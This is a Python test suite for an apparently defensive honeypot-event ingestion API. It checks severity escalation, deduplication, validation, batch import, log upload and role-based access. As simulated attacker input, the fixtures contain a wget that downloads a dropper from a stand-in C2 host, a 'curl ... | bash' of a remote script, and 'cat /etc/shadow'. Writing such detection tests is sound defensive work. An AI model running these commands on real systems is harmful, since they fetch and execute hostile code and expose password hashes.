import io
import json
import datetime
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.database import SessionLocal
from app.models import HoneypotEvent, Alert, Investigation
from app.security import create_access_token

client = TestClient(app)

@pytest.fixture
def auth_headers():
    token = create_access_token(data={"sub": "admin", "role": "admin"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def analyst_headers():
    token = create_access_token(data={"sub": "analyst", "role": "analyst"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def viewer_headers():
    token = create_access_token(data={"sub": "viewer", "role": "viewer"})
    return {"Authorization": f"Bearer {token}"}

def test_single_event_ingestion_pipeline_success(analyst_headers):
    """
    Test complete vertical slice:
    POST /events/ingest -> Normalized -> GeoIP enriched -> Persisted -> Evaluated -> Correlated -> 201 Response.
    """
    test_ip = "198.51.100.99"
    payload = {
        "eventid": "cowrie.command.input",
        "src_ip": test_ip,
        "dst_port": 22,
        "protocol": "SSH",
        "username": "root",
        "command": "wget http://malicious-c2.org/dropper.sh -O /tmp/dropper.sh && chmod +x /tmp/dropper.sh",
        "session_id": "test-session-pipeline-1",
        "severity": "medium",
        "data_source": "unit_test"
    }

    res = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res.status_code == 201, res.text
    data = res.json()

    assert data["success"] is True
    assert data["status"] == "persisted"
    assert data["event_id"] is not None
    assert data["event_hash"] is not None
    # Suspicious wget command escalates to critical
    assert data["evaluated_severity"] in ["critical", "high"]
    assert data["findings_count"] >= 1
    assert data["incident_id"] is not None
    assert data["risk_score"] is not None
    assert data["risk_score"] > 0

    # Verify database persistence
    db = SessionLocal()
    try:
        saved_ev = db.query(HoneypotEvent).filter(HoneypotEvent.id == data["event_id"]).first()
        assert saved_ev is not None
        assert saved_ev.src_ip == test_ip
        assert saved_ev.data_source == "unit_test"
        assert saved_ev.event_hash == data["event_hash"]

        # Verify incident was created
        inc = db.query(Investigation).filter(Investigation.id == data["incident_id"]).first()
        assert inc is not None
        assert test_ip in inc.description
    finally:
        db.close()

def test_duplicate_event_deduplication(analyst_headers):
    """
    Test idempotency: Submitting the identical event a second time is identified as duplicate.
    """
    fixed_ts = "2026-10-29T12:00:00Z"
    payload = {
        "eventid": "cowrie.command.input",
        "timestamp": fixed_ts,
        "src_ip": "198.51.100.100",
        "dst_port": 22,
        "protocol": "SSH",
        "username": "admin",
        "command": "id",
        "session_id": "dedup-session-abc",
        "severity": "low"
    }

    # First ingestion -> persisted
    res1 = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res1.status_code == 201
    d1 = res1.json()
    assert d1["status"] == "persisted"
    orig_id = d1["event_id"]

    # Second ingestion -> duplicate detected
    res2 = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res2.status_code == 201
    d2 = res2.json()
    assert d2["status"] == "duplicate"
    assert d2["event_id"] == orig_id
    assert "Duplicate event rejected" in d2["message"]

def test_invalid_ip_format_validation(analyst_headers):
    """Rejects malformed IP addresses with 422 Unprocessable Entity."""
    payload = {
        "eventid": "cowrie.login.failed",
        "src_ip": "999.999.999.999",
        "dst_port": 22
    }
    res = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res.status_code == 422
    assert "Invalid IP address format" in res.text

def test_invalid_port_validation(analyst_headers):
    """Rejects invalid port numbers with 422 Unprocessable Entity."""
    payload = {
        "eventid": "cowrie.login.failed",
        "src_ip": "10.0.0.1",
        "dst_port": 99999
    }
    res = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res.status_code == 422

def test_invalid_severity_validation(analyst_headers):
    """Rejects unrecognized severity strings with 422 Unprocessable Entity."""
    payload = {
        "eventid": "cowrie.login.failed",
        "src_ip": "10.0.0.1",
        "severity": "mega_critical"
    }
    res = client.post("/api/v1/events/ingest", json=payload, headers=analyst_headers)
    assert res.status_code == 422
    assert "Severity must be one of" in res.text

def test_batch_events_import(analyst_headers):
    """Tests batch importing an array of events."""
    payload = {
        "events": [
            {
                "eventid": "cowrie.login.failed",
                "src_ip": "192.0.2.11",
                "username": "root",
                "session_id": "batch-1",
                "severity": "low"
            },
            {
                "eventid": "cowrie.login.failed",
                "src_ip": "192.0.2.12",
                "username": "admin",
                "session_id": "batch-2",
                "severity": "low"
            },
            {
                "eventid": "cowrie.command.input",
                "src_ip": "192.0.2.13",
                "username": "support",
                "command": "curl -s http://attacker.com/rev.sh | bash",
                "session_id": "batch-3",
                "severity": "medium"
            }
        ]
    }

    res = client.post("/api/v1/events/import", json=payload, headers=analyst_headers)
    assert res.status_code == 200, res.text
    data = res.json()
    assert data["total_received"] == 3
    assert data["persisted"] >= 1
    assert data["alerts_generated"] >= 1
    assert len(data["events"]) == 3

def test_log_file_upload_cowrie_json(analyst_headers):
    """Tests file upload of raw JSON Lines."""
    log_content = (
        '{"eventid": "cowrie.session.connect", "src_ip": "198.51.100.22", "dst_port": 22, "protocol": "SSH", "session": "upload-sess-1"}\n'
        '{"eventid": "cowrie.command.input", "src_ip": "198.51.100.22", "dst_port": 22, "protocol": "SSH", "session": "upload-sess-1", "input": "cat /etc/shadow"}\n'
    )
    files = {"file": ("test_cowrie.log", io.BytesIO(log_content.encode("utf-8")), "text/plain")}

    res = client.post("/api/v1/events/upload", files=files, headers=analyst_headers)
    assert res.status_code == 200, res.text
    data = res.json()
    assert data["total_received"] == 2
    assert data["persisted"] >= 1

def test_ingest_rbac_viewer_rejected(viewer_headers):
    """Verifies that viewer role cannot ingest events (403 Forbidden)."""
    payload = {
        "eventid": "cowrie.login.failed",
        "src_ip": "192.0.2.99"
    }
    res = client.post("/api/v1/events/ingest", json=payload, headers=viewer_headers)
    assert res.status_code == 403
    assert "Viewer role is not authorized" in res.json()["detail"]

